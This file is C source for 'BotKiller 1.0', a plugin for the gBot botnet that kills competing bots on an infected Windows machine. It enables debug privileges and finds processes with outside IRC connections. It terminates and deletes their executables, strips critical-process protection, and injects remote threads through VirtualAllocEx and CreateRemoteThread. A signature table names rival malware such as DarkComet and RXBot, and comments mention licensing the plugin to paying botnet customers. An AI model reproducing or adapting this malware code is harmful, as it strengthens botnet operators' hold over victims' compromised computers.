/*
	BotKiller 1.0
	gBot Plugin
	~ jam3s/fubar;
*/


#include "StdAfx.h"


PROCALLOCATEANDGETTCPEXTABLEFROMSTACK lpfnAllocateAndGetTcpExTableFromStack = NULL;
tGetModuleFileNameExA pGetModuleFileNameExA = NULL;
tGetExtendedTcpTable pGetExtendedTcpTable = NULL;

HINSTANCE hIPHelper;
HINSTANCE hPsapi;
HANDLE	  hThread;
HANDLE	  hRemover;
HANDLE	  hPlugHandle;
Injdat	  sInj;

WSAData wsaData;
BOOL bWorking = FALSE;
long connections = 0;

s_Search sSearch[ ] = 
{ 
	{ "VNC Scanning Bot", "\x52\x46\x42\x20\x30\x30\x33\x2E\x30\x30\x38\x0A" }, 
	{ "RXBot", "[MAIN]" }, 
	{ "RXBot", "[SCAN]" }, 
	{ "RXBot", "[FTP]" }, 
	{ "DDoSeR", "SYNStart||*||" },
	{ "DDoSeR", "UDPStart||*||" },
	{ "DDoSeR", "PING||*||" },
	{ "Warbot", "?p=BotPoke" },
	{ "Warbot", "base.idle" },
	{ "Warbot", "ddos.tcp" },
	{ "Warbot", "ddos.http" },
	{ "Warbot", "base.download" },
	{ "SS-RAT", "SSRAT" },
	{ "SS-RAT", "winsvchosts.exe" },
	{ "SS-RAT", "winsvchosts.exe" },
	{ "SS-RAT", "Schwarze Sonne RAT" },
	{ "SS-RAT", "33|Keylogger is deactivated!" },
	{ "DarkComet", "#BOT#URLDownload" },
	{ "DarkComet", "#BOT#SvrUninstall" },
	{ "DarkComet", "#BOT#CloseServer" },
	{ "xvisceral", "downWWW" },
	{ "xvisceral", "reachableWWW" },
	{ "xvisceral", "T7X7\\7`7d7h7|7p7t7x7|7" },
	{ "Swarm", "\\erase_me" },
	{ "SubSeven", "SubSeven Server"},
	{ "Unknown", "&echo bye" }, 
	{"RXBot", "C:\\a.bat"}, 

	{"RXBot", "Mpr32.dll failed."}, 

	{"RXBot", "advscan"}, 

	{"USBBot", "[autorun]\r\nopen="},

	{"IRCBot", "-ix"},

	{"IRCBot", "PRIVMSG"},

	{"IRCBot", "PRIVMSG"},

	{"Reptile", "!!!Security!!!"}, 

	{"MSNBot", "MSNHiddenWindowClass"},

	{"Ya.Bot", "scan.stop"},

	{"Unknown", "&echo bye"}, 
	{ NULL, NULL } 
}; 
char *szIRC_Strings[] =
{
	{"001"},
	{"372"},
	{"375"},
	{"376"},
	{"422"},
	{"433"},
	{"436"},
	{"ERROR"},
	{"NOTICE"},
	{"IRC"},
	{"VERSION"},
	{"PRIVMSG"},
	{"p33k"},
	{"NOTICE"},
	{NULL}
};

/* Plugin Arch */
BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		hPlugHandle = hModule;
		if (!Start()) {
			FreeLibrary((HINSTANCE)hPlugHandle);
		}
		break;
	}

    return TRUE;
}

BOOL Verify_gBot()
{
	HANDLE hFile;

	hFile = CreateFile(sexor(GBOTPIPE, KEY), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);         
	if(hFile == INVALID_HANDLE_VALUE)																	 
	{
		return FALSE;
	}
	CloseHandle(hFile);
	return TRUE;
}

void Send_Message(char *szMessage, ...)
{
	HANDLE hFile;
	BOOL flg;
	DWORD dwWrite;
	char t[1024];
	char msg[1024];
	va_list va;
	
	va_start(va, szMessage);
	vsprintf(t, szMessage, va);
	sprintf(msg, __FUNCTION__": %s", t);
	
	hFile = CreateFile(sexor(GBOTPIPE, KEY), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);         
	if(hFile == INVALID_HANDLE_VALUE)																	 
	{
		return;
	} else {
		flg = WriteFile(hFile, msg, strlen(msg), &dwWrite, NULL);
		CloseHandle(hFile);
	}
	return;
}

BOOL Start()
{
	hIPHelper = LoadLibrary("iphlpapi.dll");
	if (hIPHelper == NULL) { return FALSE; };
	
	pGetExtendedTcpTable = (tGetExtendedTcpTable)GetProcAddress(hIPHelper, "GetExtendedTcpTable");
	if (pGetExtendedTcpTable == NULL) {
		lpfnAllocateAndGetTcpExTableFromStack = (PROCALLOCATEANDGETTCPEXTABLEFROMSTACK)GetProcAddress(hIPHelper, "AllocateAndGetTcpExTableFromStack");
	} else {
		lpfnAllocateAndGetTcpExTableFromStack = NULL;
	}
	
	if ((lpfnAllocateAndGetTcpExTableFromStack == NULL) && (pGetExtendedTcpTable == NULL)) { return FALSE; };
	
	hPsapi = LoadLibrary("Psapi.dll");
	if (hPsapi == NULL) { return FALSE;};
	pGetModuleFileNameExA = (tGetModuleFileNameExA)GetProcAddress(hPsapi, "GetModuleFileNameExA");
	if (pGetModuleFileNameExA == NULL) { return FALSE; };
	
	hThread = CreateThread(NULL, NULL, GOAT_Killer, NULL, NULL, 0);
#ifdef _DEBUGLITE
	OutputDebugString("Started thread");
#endif
	return TRUE;
}

/* Plugin Code */

char *strtolower(char *str)
{
	for (unsigned int i = 0; i < strlen(str); i++) {
		str[i] = (char)tolower(str[i]);
	}
	
	return str;
}

void EnableDebugPriv() 
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;
	
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken );
    LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &luid );
	
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
    AdjustTokenPrivileges( hToken, false, &tkp, sizeof( tkp ), NULL, NULL );
    CloseHandle( hToken ); 
}

int Get_TCP_Connections()
{
	DWORD dwLastError, dwSize;
	PMIB_TCPTABLE_EX lpBuffer = NULL;
	char szIP[1024];
	char szPort[512];
	char szProcessPath[MAX_PATH] = { 0 };
	DWORD dwPID = 0;
	DWORD dwCount = 1;
	PVOID pTCPTable = NULL;
	DWORD size = 0;
	MIB_TCPROW_OWNER_MODULE TCPTable;
	
	
	if (lpfnAllocateAndGetTcpExTableFromStack != NULL) {
		dwLastError = lpfnAllocateAndGetTcpExTableFromStack(&lpBuffer, TRUE, GetProcessHeap(), 0, 2);
	} else {
		dwLastError = pGetExtendedTcpTable(NULL, &size, true, AF_INET, TCP_TABLE_OWNER_MODULE_ALL, 0);
	}

	if (lpfnAllocateAndGetTcpExTableFromStack != NULL) {
		if (dwLastError != NO_ERROR) { return 0; };
	} else {
		while(dwLastError == ERROR_INSUFFICIENT_BUFFER)
		{
			if(pTCPTable != NULL){
				free(pTCPTable);
			} 
			pTCPTable = malloc(size);
			dwLastError = pGetExtendedTcpTable(pTCPTable, &size, true, AF_INET, TCP_TABLE_OWNER_MODULE_ALL, 0);
			if(dwLastError != NO_ERROR){
				free(pTCPTable);
				return 0;
			}
		}
		if(dwLastError != NO_ERROR){
			return 0;
		}
	}
	
	if (lpfnAllocateAndGetTcpExTableFromStack != NULL) {
		for (dwSize = 0; dwSize < lpBuffer->dwNumEntries; dwSize++)
		{
			if (lpBuffer->table[dwSize].dwRemotePort) {
				sprintf(szIP, "%d.%d.%d.%d", LOBYTE(LOWORD(lpBuffer->table[dwSize].dwRemoteAddr)), HIBYTE(LOWORD(lpBuffer->table[dwSize].dwRemoteAddr)), LOBYTE(HIWORD(lpBuffer->table[dwSize].dwRemoteAddr)), HIBYTE(HIWORD(lpBuffer->table[dwSize].dwRemoteAddr)));
				sprintf(szPort, "%d", ((lpBuffer->table[dwSize].dwRemotePort & 0xFF00) >> 8) + ((lpBuffer->table[dwSize].dwRemotePort & 0x00FF) << 8));
				dwPID = lpBuffer->table[dwSize].dwProcessId;
				if ((strcmp(szIP, "0.0.0.0")) && (strcmp(szIP, "127.0.0.1"))  
					&& (!strstr(szIP, "192.168."))
					&& (!strstr(szIP, "172.16.0."))
					&& (!strstr(szIP, "10.0.0."))
					&& (!strstr(szIP, "169.254."))
					&& (dwPID > 0))
				{
					sprintf(szProcessPath, Get_Path_From_PID(dwPID));
					if (strcmp(szProcessPath, "ERR")) {
						list_insert(dwCount, szIP, atol(szPort), dwPID, szProcessPath);
						dwCount++;
					}
				}
			}
		}
	} else {
		for (dwSize = 0; dwSize < ((PMIB_TCPTABLE_OWNER_MODULE)pTCPTable)->dwNumEntries; dwSize++)
		{
			TCPTable = ((PMIB_TCPTABLE_OWNER_MODULE)pTCPTable)->table[dwSize];
			if (TCPTable.dwRemotePort) {
				sprintf(szIP, "%d.%d.%d.%d", LOBYTE(LOWORD(TCPTable.dwRemoteAddr)), HIBYTE(LOWORD(TCPTable.dwRemoteAddr)), LOBYTE(HIWORD(TCPTable.dwRemoteAddr)), HIBYTE(HIWORD(TCPTable.dwRemoteAddr)));
				sprintf(szPort, "%d", ((TCPTable.dwRemotePort & 0xFF00) >> 8) + ((TCPTable.dwRemotePort & 0x00FF) << 8));
				dwPID = TCPTable.dwOwningPid;
				if ((strcmp(szIP, "0.0.0.0")) && (strcmp(szIP,  "127.0.0.1"))  
					&& (!strstr(szIP, "192.168."))
					&& (!strstr(szIP, "172.16.0."))
					&& (!strstr(szIP, "10.0.0."))
					&& (!strstr(szIP, "169.254."))
					&& (dwPID > 0))
				{
					sprintf(szProcessPath, Get_Path_From_PID(dwPID));
					if (strcmp(szProcessPath, "ERR")) {
						list_insert(dwCount, szIP, atol(szPort), dwPID, szProcessPath);
						dwCount++;
					}
				}
			}
		}
	}
	return (dwCount - 1);
}

char *Get_Path_From_PID(DWORD dwPID)
{
	PROCESSENTRY32 pe32Entry;
	HANDLE hSnapshot, hProcess;
	BOOL bFound = FALSE;
	char szPath[MAX_PATH] = { 0 };
	
	ZeroMemory(&pe32Entry, sizeof(pe32Entry));
	pe32Entry.dwFlags = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	pe32Entry.dwSize = sizeof(PROCESSENTRY32);
	
	if (Process32First(hSnapshot, &pe32Entry) == TRUE ) {
		EnableDebugPriv();
		while (Process32Next(hSnapshot, &pe32Entry) == TRUE ) {
			if (pe32Entry.th32ProcessID == dwPID) {
				if ((strcmp(strtolower(pe32Entry.szExeFile), strtolower("System"))) && (strcmp(strtolower(pe32Entry.szExeFile), strtolower("System Idle Process"))) && (strcmp(strtolower(pe32Entry.szExeFile), strtolower("explorer.exe"))) && (strcmp(strtolower(pe32Entry.szExeFile), strtolower("winlogon.exe"))) && (strcmp(strtolower(pe32Entry.szExeFile), strtolower("iexplore.exe"))) && (strcmp(strtolower(pe32Entry.szExeFile), strtolower("mirc.exe")))) {
					hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32Entry.th32ProcessID);
					pGetModuleFileNameExA(hProcess, NULL, szPath, sizeof(szPath));
					bFound = TRUE;
					break;
				}
				
			}
		}
	} 
	CloseHandle(hProcess);
	CloseHandle(hSnapshot);
	if (bFound == FALSE) { return "ERR"; };
	return strtok(szPath, "//");
}
BOOL Terminate_Process_By_PID(DWORD dwPID)
{
	PROCESSENTRY32 pe32Entry;
	HANDLE hSnapshot, hProcess;
	BOOL bFound = FALSE;
	char szPath[MAX_PATH] = { 0 };
	char szProcName[MAX_PATH] = { 0 };

	ZeroMemory(&pe32Entry, sizeof(pe32Entry));
	pe32Entry.dwFlags = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	pe32Entry.dwSize = sizeof(PROCESSENTRY32);
	
	if (Process32First(hSnapshot, &pe32Entry) == TRUE ) {
		EnableDebugPriv();
		while (Process32Next(hSnapshot, &pe32Entry) == TRUE ) {
			if (pe32Entry.th32ProcessID == dwPID) {
				hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32Entry.th32ProcessID);
				strcpy(szProcName, pe32Entry.szExeFile);
				bFound = TRUE;
				break;
			}
		}
	} 
	if (bFound == FALSE) { return TRUE; };
	CloseHandle(hSnapshot);
	if (strstr(strtolower(szProcName), ".dll")) {
		// Its a dll.
		FreeLibrary((HINSTANCE)hProcess);
	} else {
		RtlRemoveProcessIsCritical(hProcess, NULL);
		if (!TerminateProcess(hProcess, 0))
		{
			CloseHandle(hProcess);
			return FALSE;
		} 
	}

	return TRUE;
}

DWORD WINAPI GOAT_Killer(LPVOID lpParam)
{
	int tcp_connections;
	HANDLE hChecker;
//	HANDLE hMemScan;
	int secs = 15;
	int count = 0;
	
	// We want to check that this plugin is built for the correct customer
	// We can do this by checking if the pipe exists...
// 	if (!Verify_gBot())
// 	{
// 		// Theres no PIPE so its not built for the correct gBot customer
// 		// This most likely means he shared it or its leaked.
// 		// Maybe send an alert (dont really know)...
// //		OutputDebugString("This is a unpaid gBot plugin!");
// 		FreeLibraryAndExitThread((HINSTANCE)hPlugHandle, 0);
// 	}

	tcp_connections = Get_TCP_Connections();
	connections = tcp_connections;
	
	for (int x = 0; x < tcp_connections; x++)
	{
#ifdef _DEBUGLITE
		OutputDebugString("Checking Connection");
#endif
		hChecker = CreateThread(NULL, NULL, GOAT_CheckTCP, (LPVOID)x, NULL , 0);
		WaitForSingleObject(hChecker, (secs * 1000));
		WaitForSingleObject(hRemover, 15000);
		Sleep(3000);
	}

	// We Should Be Finished Now :)
// 	hMemScan = CreateThread(NULL, NULL, Thread_MemoryScan, NULL, NULL, 0);
// 	WaitForSingleObject(hMemScan, INFINITE);
	FreeLibraryAndExitThread((HINSTANCE)hPlugHandle, 0);
	
	return 1;
}

DWORD WINAPI GOAT_CheckTCP(LPVOID lpParam)
{
	int pos = (int)lpParam;
	SOCKADDR_IN sAddrIn;
	unsigned int uiResolve;
	struct hostent *hHostent;
	SOCKET sock;
	char szTemp[1024] = { 0 };
	char szBuff[1024] = { 0 };
	char szNick[512] = { 0 };
	int ret;
	BOOL bIRC = FALSE;
	int count = 0;
	int t = 0;
	DWORD dwRand = 0;
	char **szLines;

	// Start Winsock
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		WSACleanup();
		ExitThread(0);
	}
	// Create Socket
	if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
		WSACleanup();
		ExitThread(0);
	}
	// Resolve IP/DNS
	uiResolve = inet_addr(list_get_entry(pos)->ip);
	if (uiResolve == INADDR_NONE)
	{
		// Not an IP lets resolve Hostname..
		hHostent = gethostbyname(list_get_entry(pos)->ip);
		if (hHostent == 0) { 
			WSACleanup();
			ExitThread(0);
		} else {
			uiResolve = *(u_int *)(hHostent->h_addr);
		}
	}
	ZeroMemory(&sAddrIn, sizeof(sAddrIn));
	sAddrIn.sin_family = AF_INET;
	sAddrIn.sin_port = htons((static_cast<unsigned short>(list_get_entry(pos)->port)));
	sAddrIn.sin_addr.s_addr = uiResolve;

	struct timeval tv;
    tv.tv_sec  = 20*1000;
    tv.tv_usec = 0;
	
	if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv,  sizeof tv))
    {
#ifdef _DEBUGLITE
		printf("setsockopt failed");
#endif
        return -1;
    }
	
	// Attempt Connection
	if(connect(sock, (SOCKADDR *)&sAddrIn, sizeof(sAddrIn)) == SOCKET_ERROR) { 
		closesocket(sock);
		WSACleanup();
		ExitThread(0);
	} 
	// Ok we should be connected now ;o
	// Send Initial Connect Packet
	srand(GetTickCount());
	dwRand = rand() % 10000 + 1000;
	sprintf(szNick, "p33k-%d", dwRand);
	sprintf(szTemp, "NICK %s\r\n", szNick);
	send(sock, szTemp, strlen(szTemp), 0);
	sprintf(szTemp, "USER %s d d %s\r\n", szNick, szNick);
	send(sock, szTemp, strlen(szTemp), 0);

	// Go Into Loop
	while (1)
	{
		Sleep(250);
		memset(szBuff, 0, sizeof(szBuff));
		ret = recv(sock, szBuff, sizeof(szBuff), 0);

		if (ret <= 0) {
			closesocket(sock);
			WSACleanup();
			ExitThread(0);
		}

		if (strstr(szBuff, "PING")) {
			// Its definatly an IRC server
			bIRC = TRUE;
			szBuff[0] = 'P';
			szBuff[1] = 'O';
			szBuff[2] = 'N';
			szBuff[3] = 'G';
			send(sock, szBuff, strlen(szBuff), 0);
			hRemover = CreateThread(NULL, NULL, Remove_Bot, (LPVOID)pos, 0, 0);
			break;
		} 
		szLines = Explode(szBuff, "\r\n");
		for (t = 0; szLines[t] != NULL; t++)
		{
			if (Is_IRC(szLines[t])) {
				bIRC = TRUE;
				hRemover = CreateThread(NULL, NULL, Remove_Bot, (LPVOID)pos, 0, 0);
				break;
			}
		}
	}

	closesocket(sock);
	WSACleanup();
	return 1;
}

DWORD WINAPI Remove_Bot(LPVOID lpParam)
{
	int pos = (int)lpParam;
	char szBuff[1024] = { 0 };
	BOOL bRemoved = FALSE;
	BOOL bKilled = FALSE;
	int tries = 0;
	
	
	// Lets remove the fucker
	
	//	Send_Message("Found: %s:%d - Removing: %s\n", list_get_entry(pos)->ip, list_get_entry(pos)->port, list_get_entry(pos)->processpath);
	Sleep(500);
	
	bRemoved = (GetFileAttributes(list_get_entry(pos)->processpath) != INVALID_FILE_ATTRIBUTES);
	if (!bRemoved) { 
		// File Doesnt Exist?? Lets Ignore
		ExitThread(0);
	}
	bRemoved = FALSE;
	while (tries < 20) {
		if (tries < 10) {
			if (Terminate_Process_By_PID(list_get_entry(pos)->pid)) {
				bKilled = TRUE;
				Sleep(200);
				break;
			}
		} else {
			if (Inject_Terminate(pos)) {
				bKilled = TRUE;
				Sleep(200);
				break;
			}
		}
		
		tries++;
		Sleep(100);
	}
	
	if (bKilled)
	{
		// Terminated it.
		// Lets set the attributes to normal
		SetFileAttributes(list_get_entry(pos)->processpath, FILE_ATTRIBUTE_NORMAL);
		
		tries = 0;
		while (tries < 10) {
			// Try ten times
			if (DeleteFileA(list_get_entry(pos)->processpath))
			{
				bRemoved = TRUE;
				break;
			}
			Sleep(200);
			tries++;
		}
		bRemoved = (GetFileAttributes(list_get_entry(pos)->processpath) != INVALID_FILE_ATTRIBUTES);
		if ((GetLastError() == ERROR_NO_MORE_FILES) || (GetLastError() == ERROR_FILE_NOT_FOUND))
		{
			Send_Message("Terminated And Removed: %s (%s:%d) (%d/%d)", list_get_entry(pos)->processpath, list_get_entry(pos)->ip, list_get_entry(pos)->port, pos, connections);
		} else {
			bRemoved = (GetFileAttributes(list_get_entry(pos)->processpath) != INVALID_FILE_ATTRIBUTES);
			if (bRemoved) {
				Send_Message("Error Removing: %s (Err: %d) (%s:%d) (%d/%d)", list_get_entry(pos)->processpath, GetLastError(), list_get_entry(pos)->ip, list_get_entry(pos)->port, pos, connections);
			} else {
				Send_Message("Terminated And Removed: %s (%s:%d) (%d/%d)", list_get_entry(pos)->processpath, list_get_entry(pos)->ip, list_get_entry(pos)->port, pos, connections);
			}
		}
	} else {
		Send_Message("Error Terminating Process: %s (Err: %d) (%s:%d) (%d/%d)", list_get_entry(pos)->processpath, GetLastError(), list_get_entry(pos)->ip, list_get_entry(pos)->port, pos, connections);
	}
	return 1;
}
BOOL Is_IRC(char *szLine)
{
	BOOL bIRC = FALSE;
	char **szWords;
	
	szWords = Explode(szLine, " ");
	
	if (!strcmp(szWords[0], "ERROR")) {
		bIRC = TRUE;
		return bIRC;
	}
	
	for (int sex = 0; szIRC_Strings[sex] != NULL; sex++)
	{
		if (!strcmp(szWords[1], szIRC_Strings[sex])) {
			bIRC = TRUE;
			break;
		}
	}
	return bIRC;
}

char **Explode(char *StrIn,const char *Delimiter) // Thanks Krippler
{
	int   iSize = 10;
	char *StrIn2;
	char *strInBuf;
	char **strOutBuf = (char **)malloc(sizeof(char *) * (iSize + 1));
	int   c = 0;
	
	StrIn2 = StrIn;
	strInBuf = strtok(StrIn2, Delimiter);
	
	while(strInBuf != 0)
	{
		if(c == iSize)
		{
			iSize += 10;
			strOutBuf = (char **)realloc(strOutBuf, sizeof(char *) * (iSize + 1));
		}
		strOutBuf[c] = strInBuf;
		strInBuf = strtok(0, Delimiter);
		++c;
	}
	
	strOutBuf[c] = 0;
	return strOutBuf;
}

NTSTATUS RtlRemoveProcessIsCritical(HANDLE hProcess, PBOOL pbOldSetting) // by Napalm @ Netcore2K
{
	NTSTATUS (NTAPI *ZwQueryInformationProcess)(IN HANDLE hProcess, IN ULONG ProcessInfoClass, OUT PVOID ProcessInfo, IN ULONG ProcessInfoLength, OUT PULONG ReturnLength OPTIONAL);
	NTSTATUS (NTAPI *ZwSetInformationProcess)(IN HANDLE hProcess, IN ULONG ProcessInfoClass, IN PVOID ProcessInfo, IN ULONG ProcessInfoLength);
	HMODULE hNTDLL;
	BOOL bSetting = FALSE;
	
	if(!(hNTDLL = GetModuleHandle("ntdll")))
		return STATUS_INTERNAL_ERROR;
	
	*(FARPROC *)&ZwQueryInformationProcess = GetProcAddress(hNTDLL, "NtQueryInformationProcess");
	*(FARPROC *)&ZwSetInformationProcess   = GetProcAddress(hNTDLL, "NtSetInformationProcess");
	if(!ZwQueryInformationProcess || !ZwSetInformationProcess)
		return STATUS_INTERNAL_ERROR;
	
	if(pbOldSetting){
		*pbOldSetting = FALSE;
		ZwQueryInformationProcess(hProcess, 29, pbOldSetting, sizeof(pbOldSetting), 0);
	}
	return ZwSetInformationProcess(hProcess, 29, &bSetting, sizeof(bSetting));
}

void DoSearch( unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32 ) 
{ 
	char szBigBuffer[ 0x5000 ] = { 0 }; 
	unsigned char Curbuf[ 0x500 ] = { 0 }; 
	
	HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID ); 
	 
	for( unsigned long uCurAddr = uStartAddr; uCurAddr <= uEndAddr; uCurAddr++ ) 
	{ 
		BOOL bRead = ReadProcessMemory( hProcess, (void *)uCurAddr, (void *)&Curbuf, sizeof( Curbuf ), NULL ); 
		
		//Sleep(1);
		
		if( bRead ) 
		{ 
			int c = 0; 
			
			strcat( szBigBuffer, (char *)Curbuf );          
			
			while( sSearch[ c ].szString != NULL ) 
			{ 
				if( strstr( szBigBuffer, sSearch[ c ].szString ) ) 
				{ 
				//	Send_Message( "Found %s in \"%s\"", sSearch[ c ].szBot, pe32.szExeFile ); 
					KillBot( pe32, sSearch[c].szBot );                
				} 
				
				c++; 
			} 
			
			if( sizeof( szBigBuffer ) > 0x150 ) 
				ZeroMemory( szBigBuffer, sizeof( szBigBuffer ) ); 
		} 
		
		if( !bRead ) 
			break; 
	} 
	
	CloseHandle( hProcess ); 
}; 

void KillBot( PROCESSENTRY32 pe32, char *szFound ) 
{ 
	MODULEENTRY32 me32 = { 0 }; 
	HANDLE hPath = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, pe32.th32ProcessID ); 
	HANDLE hKillProcess; 
	
	me32.dwSize = sizeof( me32 ); 
	
	BOOL bRetval = Module32First( hPath, &me32 ); 
	// Lets try make it uncritical incase... (fucking xvisceral)
	// ty Napalm.
	
	while( bRetval ) 
	{ 
		if( !strcmp( pe32.szExeFile, me32.szModule ) ) 
		{ 
			// Rest
			SetFileAttributes( me32.szExePath, FILE_ATTRIBUTE_NORMAL ); 
			hKillProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID ); 
			RtlRemoveProcessIsCritical(hKillProcess, NULL);
			Sleep (500);
			TerminateProcess( hKillProcess, 0 ); 
			Sleep(500); 
			
			if( DeleteFile( me32.szExePath ) ) 
				printf( "Terminated & Removed: %s (%s)", szFound, me32.szExePath );          
		} 
		bRetval = Module32Next( hPath, &me32 ); 
	}    
	
	CloseHandle( hKillProcess ); 
	CloseHandle( hPath ); 
}; 

DWORD WINAPI Thread_MemoryScan(LPVOID lpParam)
{
	char szFile[ 128 ]; 
	GetModuleFileName( GetModuleHandle( NULL ), szFile, sizeof( szFile ) ); 
	
	char* szBlockList[ ] = { "explorer.exe", "WINLOGON.EXE", "SERVICES.EXE", "VMwareTray.exe", "VMwareUser.exe", "VMwareService.exe", szFile };       
	HANDLE hProcess = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 ); 
	PROCESSENTRY32 pe32; 
	
	pe32.dwSize = sizeof( PROCESSENTRY32 ); 
	
	BOOL bRetval = Process32First( hProcess, &pe32 ); 
	bool bDoSearch = true; 
	
	while( bRetval ) 
	{ 
		Sleep( 250 ); 
		
		for( int i = 0; i < ( sizeof( szBlockList ) / sizeof( char* ) ); i++ ) 
		{ 
			if( strstr( szBlockList[ i ], pe32.szExeFile ) ) 
				bDoSearch = false; 
		} 
		
		if( bDoSearch ) 
		{ 
			DoSearch( 0x00400000, 0x004FFFFF, pe32 ); 
			DoSearch( 0x00100000 ,0x001FFFFF, pe32 ); 
		} 
		
		else 
			bDoSearch = true; 
		
		bRetval = Process32Next( hProcess, &pe32 ); 
	} 
	CloseHandle( hProcess );
	
	return 1;
}


/* Inject Code */

DWORD WINAPI Remote_TerminateProcess(LPVOID lpParam)
{
	pInjdat pInj = (pInjdat)lpParam;
	
	// Should be inside process...
	
	pInj->ExitProcess(0);
	
	// Should have exited the motherfucking goat.
	
	return 1;
}
static void __declspec() ProcEnd_TerminateProcess() {}


BOOL Inject_Terminate(long pos)
{
	HINSTANCE hKernel;
	PROCESSENTRY32 pe32Entry;
	HANDLE hSnapshot, hProcess;
	BOOL bFound = FALSE;
	char szPath[MAX_PATH] = { 0 };
	DWORD dwPID = 0;
	int tries = 0;

	dwPID = list_get_entry(pos)->pid;

	hKernel = LoadLibrary("kernel32.dll");
		sInj.ExitProcess = (EP)GetProcAddress(hKernel, "ExitProcess");
	FreeLibrary(hKernel);

	if (sInj.ExitProcess == NULL) {
		// Couldnt load api - fuck knows whats up with system - all sys should have this api
		// lets try a normal process kill ;o
		if (Terminate_Process_By_PID(list_get_entry(pos)->pid))
		{
			return TRUE;
		} else {
			// do some more chjecks but keep it simple for now
			for (tries = 0; tries < 5; tries++)
			{
				Sleep(50);
				if (Terminate_Process_By_PID(dwPID)) {
					return TRUE;
				}
			}
			return FALSE;
		}
	}

	ZeroMemory(&pe32Entry, sizeof(pe32Entry));
	pe32Entry.dwFlags = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	pe32Entry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &pe32Entry) == TRUE ) {
		EnableDebugPriv();
		while (Process32Next(hSnapshot, &pe32Entry) == TRUE ) {
			if (pe32Entry.th32ProcessID == dwPID) {
				hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32Entry.th32ProcessID);
				bFound = TRUE;
				break;
			}
		}
	} 
	CloseHandle(hSnapshot);
	if (bFound == FALSE) {
		// Couldnt find it??
		if (Terminate_Process_By_PID(dwPID)) {
			return TRUE;
		} else {
			// do some more chjecks but keep it simple for now
			for (tries = 0; tries < 5; tries++)
			{
				Sleep(50);
				if (Terminate_Process_By_PID(dwPID)) {
					return TRUE;
				}
			}
			return FALSE;
		}
	}
	// Ok we should have a valid handle process - lets do the motherfucking inject ;x
	
	DWORD dwSize = 0;
	HANDLE hThread;
	LPVOID lpStructs;
	threads tTerminateProc = NULL;

	dwSize = (LPBYTE)ProcEnd_TerminateProcess - (LPBYTE)Remote_TerminateProcess;
	tTerminateProc = (threads)inject(hProcess, (LPVOID)Remote_TerminateProcess, dwSize);
	if (tTerminateProc == NULL) {
		// do some more checks but keep it simple for now
		for (tries = 0; tries < 5; tries++)
		{
			Sleep(50);
			if (Terminate_Process_By_PID(dwPID)) {
				return TRUE;
			}
		}
		return FALSE;
	}
	
	lpStructs = inject(hProcess, &sInj, sizeof(Injdat));
	if (lpStructs == NULL) {
		// do some more checks but keep it simple for now
		for (tries = 0; tries < 5; tries++)
		{
			Sleep(50);
			if (Terminate_Process_By_PID(dwPID)) {
				return TRUE;
			}
		}
		return FALSE;
	}
	hThread = CreateRemoteThread(hProcess, NULL, 65535, (LPTHREAD_START_ROUTINE)tTerminateProc, lpStructs, 0, 0);
	// maybe wait for thread to finish?
	Sleep(1000);
	return TRUE;
}

PDWORD inject(HANDLE hProcess, LPVOID ThreadStart, DWORD cboSize)
{
	PDWORD pdwCodeRemote = NULL;
	PDWORD pdwCodeRemote2 = NULL;
	DWORD dwOldProtect, dwNumBytesXferred = 0;
	
	pdwCodeRemote = (PDWORD)VirtualAllocEx(hProcess, 0, cboSize, MEM_COMMIT | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
	
	if (pdwCodeRemote == 0)
		return 0;
	if (!VirtualProtectEx(hProcess, pdwCodeRemote, cboSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) 
		return 0;
	if (WriteProcessMemory( hProcess, pdwCodeRemote, ThreadStart, cboSize, &dwNumBytesXferred) == 0)
		return 0;
	
	return pdwCodeRemote;
}

char *sexor(char *string, char *decode_key)
{
	unsigned int	i, j;
	char *orig = (char *)malloc(strlen(string)+1);
	
	memset(orig, 0, sizeof(orig));
	sprintf(orig, string);
	
	for ( i = 0; i < strlen( orig ); i++ ) {
		for ( j = 0; j < strlen( decode_key ); j++ )
			orig[ i ] ^= decode_key[ j ];
		
		orig[ i ] =~ orig[ i ];
		
	}
	return orig;	
}